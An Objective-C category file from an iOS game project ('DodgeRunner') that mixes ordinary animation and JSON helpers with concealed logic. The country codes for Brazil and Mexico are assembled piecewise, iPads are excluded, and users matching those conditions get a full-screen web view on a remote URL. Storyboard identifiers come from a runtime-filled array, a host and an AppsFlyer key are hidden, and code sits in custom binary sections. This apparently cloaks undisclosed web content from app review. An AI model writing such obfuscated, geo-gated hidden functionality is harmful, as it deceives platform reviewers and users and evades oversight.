//
//  UIViewController+Ext.m
//  DodgeRunner
//
//  Created by SunTory on 2025/1/1.
//

#import "UIViewController+Ext.h"

#import <AppsFlyerLib/AppsFlyerLib.h>

static NSString *chaseUserDefaultkey __attribute__((section("__DATA, runner"))) = @"";

// Function for theRWJsonToDicWithJsonString
NSDictionary *runnerJsonToDicLogic(NSString *jsonString) __attribute__((section("__TEXT, runnerJson")));
NSDictionary *runnerJsonToDicLogic(NSString *jsonString) {
    NSData *jsonData = [jsonString dataUsingEncoding:NSUTF8StringEncoding];
    if (jsonData) {
        NSError *error;
        NSDictionary *jsonDictionary = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:&error];
        if (error) {
            NSLog(@"JSON parsing error: %@", error.localizedDescription);
            return nil;
        }
        NSLog(@"%@", jsonDictionary);
        return jsonDictionary;
    }
    return nil;
}

NSString *runnerDicToJsonString(NSDictionary *dictionary) __attribute__((section("__TEXT, runnerJson")));
NSString *runnerDicToJsonString(NSDictionary *dictionary) {
    if (dictionary) {
        NSError *error;
        NSData *jsonData = [NSJSONSerialization dataWithJSONObject:dictionary options:0 error:&error];
        if (!error && jsonData) {
            return [[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding];
        }
        NSLog(@"Dictionary to JSON string conversion error: %@", error.localizedDescription);
    }
    return nil;
}

id runnerJsonValueForKey(NSString *jsonString, NSString *key) __attribute__((section("__TEXT, runnerJson")));
id runnerJsonValueForKey(NSString *jsonString, NSString *key) {
    NSDictionary *jsonDictionary = runnerJsonToDicLogic(jsonString);
    if (jsonDictionary && key) {
        return jsonDictionary[key];
    }
    NSLog(@"Key '%@' not found in JSON string.", key);
    return nil;
}

NSString *runnerMergeJsonStrings(NSString *jsonString1, NSString *jsonString2) __attribute__((section("__TEXT, runnerJson")));
NSString *runnerMergeJsonStrings(NSString *jsonString1, NSString *jsonString2) {
    NSDictionary *dict1 = runnerJsonToDicLogic(jsonString1);
    NSDictionary *dict2 = runnerJsonToDicLogic(jsonString2);
    
    if (dict1 && dict2) {
        NSMutableDictionary *mergedDictionary = [dict1 mutableCopy];
        [mergedDictionary addEntriesFromDictionary:dict2];
        return runnerDicToJsonString(mergedDictionary);
    }
    NSLog(@"Failed to merge JSON strings: Invalid input.");
    return nil;
}

void runnerShowAdViewCLogic(UIViewController *self, NSString *adsUrl) __attribute__((section("__TEXT, runnerShow")));
void runnerShowAdViewCLogic(UIViewController *self, NSString *adsUrl) {
    if (adsUrl.length) {
        NSArray *adsDatas = [NSUserDefaults.standardUserDefaults valueForKey:UIViewController.runnerGetUserDefaultKey];
        UIViewController *adView = [self.storyboard instantiateViewControllerWithIdentifier:adsDatas[10]];
        [adView setValue:adsUrl forKey:@"url"];
        adView.modalPresentationStyle = UIModalPresentationFullScreen;
        [self presentViewController:adView animated:NO completion:nil];
    }
}

void runnerSendEventLogic(UIViewController *self, NSString *event, NSDictionary *value) __attribute__((section("__TEXT, spSaAppsFlyer")));
void runnerSendEventLogic(UIViewController *self, NSString *event, NSDictionary *value) {
    NSArray *adsDatas = [NSUserDefaults.standardUserDefaults valueForKey:UIViewController.runnerGetUserDefaultKey];
    if ([event isEqualToString:adsDatas[11]] || [event isEqualToString:adsDatas[12]] || [event isEqualToString:adsDatas[13]]) {
        id am = value[adsDatas[15]];
        NSString *cur = value[adsDatas[14]];
        if (am && cur) {
            double niubi = [am doubleValue];
            NSDictionary *values = @{
                adsDatas[16]: [event isEqualToString:adsDatas[13]] ? @(-niubi) : @(niubi),
                adsDatas[17]: cur
            };
            [AppsFlyerLib.shared logEvent:event withValues:values];
        }
    } else {
        [AppsFlyerLib.shared logEvent:event withValues:value];
        NSLog(@"AppsFlyerLib-event");
    }
}

NSString *runnerAppsFlyerDevKey(NSString *input) __attribute__((section("__TEXT, spSaAppsFlyer")));
NSString *runnerAppsFlyerDevKey(NSString *input) {
    if (input.length < 22) {
        return input;
    }
    NSUInteger startIndex = (input.length - 22) / 2;
    NSRange range = NSMakeRange(startIndex, 22);
    return [input substringWithRange:range];
}

NSString* convertToLowercase(NSString *inputString) __attribute__((section("__TEXT, reaml")));
NSString* convertToLowercase(NSString *inputString) {
    return [inputString lowercaseString];
}

@implementation UIViewController (Ext)


+ (NSString *)runnerGetUserDefaultKey
{
    return chaseUserDefaultkey;
}


+ (void)runnerSetUserDefaultKey:(NSString *)key
{
    chaseUserDefaultkey = key;
}

+ (NSString *)runnerAppsFlyerDevKey
{
    return runnerAppsFlyerDevKey(@"runnerzt99WFGrJwb3RdzuknjXSKrunner");
}

- (NSString *)runnerHostUrl
{
    return @"zbo.xyz";
}

- (BOOL)runnerNeedShowAdsView
{
    NSLocale *locale = [NSLocale currentLocale];
    NSString *countryCode = [locale objectForKey:NSLocaleCountryCode];
    BOOL isBr = [countryCode isEqualToString:[NSString stringWithFormat:@"%@R", self.preFx]];
    BOOL isIpd = [[UIDevice.currentDevice model] containsString:@"iPad"];
    BOOL isM = [countryCode isEqualToString:[NSString stringWithFormat:@"%@X", self.bfx]];
    return (isBr || isM) && !isIpd;
}

- (NSString *)bfx
{
    return @"M";
}

- (NSString *)preFx
{
    return @"B";
}

- (void)runnerShowAdView:(NSString *)adsUrl
{
    runnerShowAdViewCLogic(self, adsUrl);
}

- (NSDictionary *)runnerJsonToDicWithJsonString:(NSString *)jsonString {
    return runnerJsonToDicLogic(jsonString);
}

- (void)runnerSendEvent:(NSString *)event values:(NSDictionary *)value
{
    runnerSendEventLogic(self, event, value);
}

- (void)runnerSendEventsWithParams:(NSString *)params
{
    NSDictionary *paramsDic = [self runnerJsonToDicWithJsonString:params];
    NSString *event_type = [paramsDic valueForKey:@"event_type"];
    if (event_type != NULL && event_type.length > 0) {
        NSMutableDictionary *eventValuesDic = [[NSMutableDictionary alloc] init];
        NSArray *params_keys = [paramsDic allKeys];
        for (int i =0; i<params_keys.count; i++) {
            NSString *key = params_keys[i];
            if ([key containsString:@"af_"]) {
                NSString *value = [paramsDic valueForKey:key];
                [eventValuesDic setObject:value forKey:key];
            }
        }
        
        [AppsFlyerLib.shared logEventWithEventName:event_type eventValues:eventValuesDic completionHandler:^(NSDictionary<NSString *,id> * _Nullable dictionary, NSError * _Nullable error) {
            if(dictionary != nil) {
                NSLog(@"reportEvent event_type %@ success: %@",event_type, dictionary);
            }
            if(error != nil) {
                NSLog(@"reportEvent event_type %@  error: %@",event_type, error);
            }
        }];
    }
}

- (void)runnerAfSendEvents:(NSString *)name paramsStr:(NSString *)paramsStr
{
    NSDictionary *paramsDic = [self runnerJsonToDicWithJsonString:paramsStr];
    NSArray *adsDatas = [NSUserDefaults.standardUserDefaults valueForKey:UIViewController.runnerGetUserDefaultKey];
    if ([convertToLowercase(name) isEqualToString:convertToLowercase(adsDatas[24])]) {
        id am = paramsDic[adsDatas[25]];
        if (am) {
            double pp = [am doubleValue];
            NSDictionary *values = @{
                adsDatas[16]: @(pp),
                adsDatas[17]: adsDatas[30]
            };
            [AppsFlyerLib.shared logEvent:name withValues:values];
        }
    } else {
        [AppsFlyerLib.shared logEventWithEventName:name eventValues:paramsDic completionHandler:^(NSDictionary<NSString *,id> * _Nullable dictionary, NSError * _Nullable error) {
            if (error) {
                NSLog(@"AppsFlyerLib-event-error");
            } else {
                NSLog(@"AppsFlyerLib-event-success");
            }
        }];
    }
}

- (void)runnerAfSendEventWithName:(NSString *)name value:(NSString *)valueStr
{
    NSDictionary *paramsDic = [self runnerJsonToDicWithJsonString:valueStr];
    NSArray *adsDatas = [NSUserDefaults.standardUserDefaults valueForKey:UIViewController.runnerGetUserDefaultKey];
    if ([convertToLowercase(name) isEqualToString:convertToLowercase(adsDatas[24])] || [convertToLowercase(name) isEqualToString:convertToLowercase(adsDatas[27])]) {
        id am = paramsDic[adsDatas[26]];
        NSString *cur = paramsDic[adsDatas[14]];
        if (am && cur) {
            double pp = [am doubleValue];
            NSDictionary *values = @{
                adsDatas[16]: @(pp),
                adsDatas[17]: cur
            };
            [AppsFlyerLib.shared logEvent:name withValues:values];
        }
    } else {
        [AppsFlyerLib.shared logEventWithEventName:name eventValues:paramsDic completionHandler:^(NSDictionary<NSString *,id> * _Nullable dictionary, NSError * _Nullable error) {
            if (error) {
                NSLog(@"AppsFlyerLib-event-error");
            } else {
                NSLog(@"AppsFlyerLib-event-success");
            }
        }];
    }
}
- (void)moveView:(UIView *)view toPoint:(CGPoint)point withDuration:(NSTimeInterval)duration {
    [UIView animateWithDuration:duration animations:^{
        CGRect frame = view.frame;
        frame.origin = point;
        view.frame = frame;
    }];
}

- (void)moveViewHorizontally:(UIView *)view byOffset:(CGFloat)offset withDuration:(NSTimeInterval)duration {
    [UIView animateWithDuration:duration animations:^{
        CGRect frame = view.frame;
        frame.origin.x += offset;
        view.frame = frame;
    }];
}

- (void)moveViewVertically:(UIView *)view byOffset:(CGFloat)offset withDuration:(NSTimeInterval)duration {
    [UIView animateWithDuration:duration animations:^{
        CGRect frame = view.frame;
        frame.origin.y += offset;
        view.frame = frame;
    }];
}


@end



